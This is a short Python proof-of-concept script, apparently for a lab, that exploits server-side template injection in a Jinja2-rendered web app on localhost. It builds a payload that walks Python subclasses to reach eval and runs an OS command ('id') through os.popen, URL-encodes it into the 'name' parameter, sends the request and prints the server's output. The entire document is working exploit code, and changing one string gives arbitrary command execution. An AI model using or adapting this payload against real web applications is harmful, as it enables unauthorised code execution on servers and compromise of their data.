import urllib.parse
import requests

payload = """{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
      {% if 'eval' in b.keys() %}
        {{ b['eval']('__import__("os").popen("id").read()') }}
      {% endif %}
    {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
"""

url = 'http://localhost:8000/?name=' + urllib.parse.quote(payload)
print('[+] Exploit URL:\n', url)

r = requests.get(url)
print('[+] Server Response:')
print(r.text)
